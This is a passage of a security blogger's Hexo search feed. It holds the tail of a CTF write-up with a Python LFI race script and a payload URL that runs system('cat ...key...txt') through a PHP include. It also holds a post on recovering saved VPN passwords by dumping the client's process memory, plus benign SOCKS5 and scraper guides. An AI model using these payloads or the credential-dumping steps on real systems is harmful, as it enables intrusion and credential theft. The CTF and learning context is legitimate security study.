class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">写入<span class="regexp">/tmp/g</span></span><br><span class="line">再访问</span><br><span class="line">http:<span class="regexp">//</span><span class="number">39.98</span>.<span class="number">39.234</span>:<span class="number">41213</span><span class="regexp">/lfi.php?file=/</span>tmp<span class="regexp">/g&amp;1=system(%27cat ../</span>..<span class="regexp">/../</span>key_8ujr4y7sg9.txt%<span class="number">27</span>);</span><br></pre></td></tr></table></figure>

<p>可以参考这个：</p>
<p><a href="https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf" target="_blank" rel="noopener">https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf</a></p>
<p><a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a></p>
<h5 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415210115631.png" alt=""></p>
<p>当时没做出来…</p>
<h5 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415210240685.png" alt="image-20200415210240685"></p>
<p>6379端口直接Redis未授权访问漏洞利用就可以了</p>
<p>Redis未授权访问漏洞利用：<a href="https://xz.aliyun.com/t/6103#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/6103#toc-0</a></p>
<h5 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415210141901.png" alt="image-20200415210141901"></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415212727024.png" alt="image-20200415212727024"></p>
<h5 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h5><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415210621743.png" alt="image-20200415210621743"></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415213042571.png" alt="image-20200415213042571"></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415211006676.png" alt="image-20200415211006676"></p>
<h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h3><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/image-20200415213423379.png" alt="image-20200415213423379"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7搭建Socks5</title>
    <url>/2020/04/04/Centos7%E6%90%AD%E5%BB%BASocks5/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">操作系统：Ce<span class="symbol">ntos7</span></span><br><span class="line">管理工具：Xshell</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="Socks5"><a href="#Socks5" class="headerlink" title="Socks5"></a>Socks5</h3><h4 id="Socks5安装"><a href="#Socks5安装" class="headerlink" title="Socks5安装"></a>Socks5安装</h4><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装依赖项</span></span><br><span class="line">yum <span class="keyword">install</span> gcc openldap-devel pam-devel openssl-devel -y</span><br></pre></td></tr></table></figure>

<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">wget http:<span class="string">//nchc.dl.sourceforge.net/project/ss5/ss5/3.8.9-8/ss5-3.8.9-8.tar.gz</span> <span class="comment"># 下载安装包</span></span><br><span class="line">tar -xzvf ss5-3.8.9-8.tar.gz <span class="comment"># 解压缩</span></span><br><span class="line"><span class="keyword">cd</span> ss5-3.8.9 <span class="comment"># 切换目录</span></span><br><span class="line"><span class="string">./configure</span> &amp;&amp; make &amp;&amp; make install <span class="comment"># 编译安装</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Centos7%E6%90%AD%E5%BB%BASocks5/image-20200404214505383.png" alt="image-20200404214505383"></p>
<h4 id="Socks5配置"><a href="#Socks5配置" class="headerlink" title="Socks5配置"></a>Socks5配置</h4><h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vim</span> /etc/<span class="keyword">opt</span>/ss5/ss5.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">auth <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> – -</span><br><span class="line">改为</span><br><span class="line">auth <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> – u</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">permit – <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> – <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> - - - - -</span><br><span class="line">改为</span><br><span class="line">permit u <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> – <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">0</span> - - - - -</span><br></pre></td></tr></table></figure>

<p><img src="/img/Centos7%E6%90%AD%E5%BB%BASocks5/image-20200404192600090.png" alt="image-20200404192600090"></p>
<h5 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>opt<span class="regexp">/ss5/</span>ss5.passwd</span><br><span class="line">格式：[用户名] [密码] <span class="comment">#一个用户一行</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Centos7%E6%90%AD%E5%BB%BASocks5/image-20200404192352676.png" alt="image-20200404192352676"></p>
<h5 id="Socks5-启动"><a href="#Socks5-启动" class="headerlink" title="Socks5 启动"></a>Socks5 启动</h5><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">service ss5 <span class="literal">start</span></span><br></pre></td></tr></table></figure>

<h5 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h5><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">service ss5 stutas <span class="comment"># 服务状态</span></span><br><span class="line">netstat -lntp  | <span class="keyword">grep</span> ss5 <span class="comment">#网络连接 </span></span><br><span class="line">注：安全策略需要放行对应的端口策略</span><br></pre></td></tr></table></figure>

<p><img src="/img/Centos7%E6%90%AD%E5%BB%BASocks5/image-20200404192302483.png" alt="image-20200404192302483"></p>
<h4 id="客户端连接验证"><a href="#客户端连接验证" class="headerlink" title="客户端连接验证"></a>客户端连接验证</h4><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">curl --socks5 xx.xx.xx.<span class="string">xx:</span><span class="number">1080</span> --proxy-user <span class="string">user:</span>password <span class="string">http:</span><span class="comment">//ipinfo.io/ip</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Centos7%E6%90%AD%E5%BB%BASocks5/image-20200404214334247.png" alt="image-20200404214334247"></p>
]]></content>
      <tags>
        <tag>Socks</tag>
      </tags>
  </entry>
  <entry>
    <title>公众号文章爬虫并生成PDF+HTML</title>
    <url>/2020/04/04/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>因某些原因会导致一些公众号的文章会给发布者删除，所以就想着把公众号的文章进行爬虫到本地进行留档。</p>
<a id="more"></a>

<h3 id="爬虫方法"><a href="#爬虫方法" class="headerlink" title="爬虫方法"></a>爬虫方法</h3><p>目前我了解的爬取微信公众号文章的方法主要是四种：</p>
<p>1、第三方的公众号聚合网站（如：weixin.sogou.com）；</p>
<p>2、网页版微信（现已无法限制登陆了）；</p>
<p>3、微信程序访问公众号文章的接口；</p>
<p>4、公众号平台引用文章接口（需要申请公众号）。</p>
<p>这里我们采用公众号平台引用文章接口的方式去实现。</p>
<h3 id="通过公众号平台引用文章接口爬虫思路"><a href="#通过公众号平台引用文章接口爬虫思路" class="headerlink" title="通过公众号平台引用文章接口爬虫思路"></a>通过公众号平台引用文章接口爬虫思路</h3><h4 id="引用文章接口"><a href="#引用文章接口" class="headerlink" title="引用文章接口"></a>引用文章接口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登陆公众号&gt;&gt;首页&gt;&gt;新建群发&gt;&gt;自建图文&gt;&gt;超链接</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404122132481.png" alt="image-20200404122132481"></p>
<p>通过网络请求，我们可以看到我们需要的一些数据（文章链接、标题等），如图：</p>
<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404122534217.png" alt="image-20200404122534217"></p>
<h4 id="流程设计"><a href="#流程设计" class="headerlink" title="流程设计"></a>流程设计</h4><p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404191340454.png" alt="image-20200404191340454"></p>
<h4 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h4><p>这里就不做过程的一些分析了，所以直接贴EXE的可执行程序了（代码写的太垃圾了，就不放源码了）。</p>
<p>GitHub地址：<a href="https://github.com/ScriptKid-Beta/Wechat_Articles_Spider" target="_blank" rel="noopener">https://github.com/ScriptKid-Beta/Wechat_Articles_Spider</a></p>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>安装wkhtmltopdf：</p>
<p>下载wkhtmltopdf：<a href="https://wkhtmltopdf.org/downloads.html" target="_blank" rel="noopener">https://wkhtmltopdf.org/downloads.html</a>  </p>
<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404180406270.png" alt="image-20200404180406270"></p>
<p>将下载好的wkhtmltox-0.12.5-1.mxe-cross-win64 文件解压缩并放到跟程序同一个目录，如图：</p>
<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404184015589.png" alt="image-20200404184015589"></p>
<p>安装chromedriver：</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#查看版本信息</span></span><br><span class="line">浏览器中输入：chrome:<span class="comment">//version/</span></span><br></pre></td></tr></table></figure>

<p>chromedriver的版本一定要与Chrome的版本一致，不然可能就不起作用。</p>
<p>下载链接：</p>
<p><a href="https://npm.taobao.org/mirrors/chromedriver/" target="_blank" rel="noopener">https://npm.taobao.org/mirrors/chromedriver/</a></p>
<p><a href="http://chromedriver.storage.googleapis.com/index.html" target="_blank" rel="noopener">http://chromedriver.storage.googleapis.com/index.html</a></p>
<p>下载好放在跟程序同一目录下即可。</p>
<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404183023403.png" alt="image-20200404183023403"></p>
<p>双击打开wechat_pdf.exe程序运行。</p>
<p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404191021202.png" alt="image-20200404191021202"></p>
<h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%88%AC%E8%99%AB%E5%B9%B6%E7%94%9F%E6%88%90PDF+HTML/image-20200404190937280.png" alt="image-20200404190937280"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/67sk-uKz9Ct4niT-f4u1KA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/67sk-uKz9Ct4niT-f4u1KA</a>?</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMDM4MTA2MA==&amp;mid=2455304609&amp;idx=1&amp;sn=b7496563aab42e92060bd68936bc4212&amp;chksm=8cfd6bcabb8ae2dc606b060fecf3f837177e3ef22a05a30ee28ebefd75c6677b29df3e426692&amp;token=2137480545&amp;lang=zh_CN#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxMDM4MTA2MA==&amp;mid=2455304609&amp;idx=1&amp;sn=b7496563aab42e92060bd68936bc4212&amp;chksm=8cfd6bcabb8ae2dc606b060fecf3f837177e3ef22a05a30ee28ebefd75c6677b29df3e426692&amp;token=2137480545&amp;lang=zh_CN#rd</a></p>
]]></content>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透-VPN密码获取小技巧</title>
    <url>/2020/03/31/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<a id="more"></a>

<h4 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h4><p>&emsp;&emsp;学习到的姿势，分享出来，手法也很基础，请各位师傅多多指教。</p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><h5 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h5><p>&emsp;&emsp;一般情况下，我们进行内网渗透过程中获取到管理员或者其他目标主机时多数情况会遇到主机中存在VPN连接客户端并大多数都是保存密码，如图：</p>
<p><img src="/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/01.png" alt=""></p>
<h5 id="星号查看器"><a href="#星号查看器" class="headerlink" title="星号查看器"></a>星号查看器</h5><p>&emsp;&emsp;此时获取目标时一般情况下会想到星号查看器，但是由于客户端做了防护，无法用星号查看器获取到内容，如图：</p>
<p><img src="/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/02.png" alt="02"></p>
<h5 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h5><p>&emsp;&emsp;发现当Client端当用户密码错误时会出现在内存中，我们可以将正确的密码后面加个字符（如：$）</p>
<p><img src="/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/04.png" alt="1578897375411"></p>
<p>&emsp;&emsp;然后我们将Client进程的内存进行dump，这里使用procdump，然后strings一下</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">procdump64</span><span class="selector-class">.exe</span> <span class="selector-tag">-accepteula</span> <span class="selector-tag">-ma</span> 14256 <span class="selector-tag">vpn</span><span class="selector-class">.dmp</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/05.png" alt="05"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>s vpn.dmp | grep -F <span class="string">'PIN:'</span> -A <span class="number">6</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-VPN%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/07.png" alt="07"></p>
<h4 id="写到最后"><a href="#写到最后" class="headerlink" title="写到最后"></a>写到最后</h4><p>以上测试过程纯属本人杜撰，请遵守《网络安全法》等相关法律法规。</p>
]]></content>
      <tags>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>历史文章</title>
    <url>/2020/03/29/History/</url>
    <content><![CDATA[<p>&emsp;&emsp;因之前文章采用云图床导致文章大部分挂链，现将部分历史文章进行pdf存档，后续文章采用本地图床。</p>


	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/常见未授权访问漏洞总结.pdf" width="100%" height="550" type="application/pdf">
	</div>



<a id="more"></a>


	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/OSSEC安装部署.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-color.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-easy_crypto.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-flag在index里.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-web2.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-web3.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-WEB4.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-web5.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-web基础$_GET.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-web基础$_POST.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85(xp0intCTF).pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-你必须让他停下.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-变量1.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-域名解析.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-备份是个好习惯.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-头等舱.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-好多压缩包.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-怀疑人生.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-成绩单.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-本地包含.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-点击一百万次.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-矛盾.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-秋名山老司机.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-网站被黑.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-计算器.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-论剑.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-输入密码查看flag.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Bugku-速度要快.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/burp%20suite介绍.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/CBC字节翻转攻击原理.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Centos7更换软件安装源.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/MORSE与ASCII码对应表.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/PHP语法.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Python学习笔记.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/SQL注入攻击及防御.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/ssh基于密钥认证登陆.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/SSH密码暴力破解及防御实战笔记.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Web信息收集之搜索引擎.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/XSS跨站脚本攻击.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/zip压缩包--加密破解篇.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/zip文件格式说明.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/内网信息收集.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/文件上传.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/正则表达式之零宽断言.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/目标信息收集.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/AWVS%20介绍.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/CVE_2019_0708复现.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/fastjson漏洞复现.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/mimipenguin.pdf" width="100%" height="550" type="application/pdf">
	</div>





	<div class="row">
    <embed src="https://scriptkid-beta.github.io/pdf/Redis漏洞复现.pdf" width="100%" height="550" type="application/pdf">
	</div>


]]></content>
      <categories>
        <category>历史文章</category>
      </categories>
      <tags>
        <tag>历史文章</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习笔记</title>
    <url>/2019/03/27/201939/</url>
    <content><![CDATA[<iframe id="embed_dom" name="embed_dom" frameborder="0" style="display:block;width:100%; height:600px;" src="https://www.processon.com/embed/mind/5c0a7900e4b0e4a514241578"></iframe>
<a id="more"></a>

<p>一款挺好的在线创作的思维导图、流程图等<br><a href="https://www.processon.com/i/5c09c763e4b0ca4b40cae793" target="_blank" rel="noopener">https://www.processon.com/i/5c09c763e4b0ca4b40cae793</a></p>
<p>PNG格式<br><a href="http://assets.processon.com/chart_image/5c0a7900e4b0e4a51424157b.png" target="_blank" rel="noopener">http://assets.processon.com/chart_image/5c0a7900e4b0e4a51424157b.png</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>勿忘初心</title>
    <url>/2019/01/29/2019/</url>
    <content><![CDATA[<p>努力努力再努力</p>
<a id="more"></a>
<p>Hello,Blog!</p>
]]></content>
      <categories>
        <category>勿忘初心</category>
      </categories>
      <tags>
        <tag>努力努力再努力</tag>
      </tags>
  </entry>
</search>
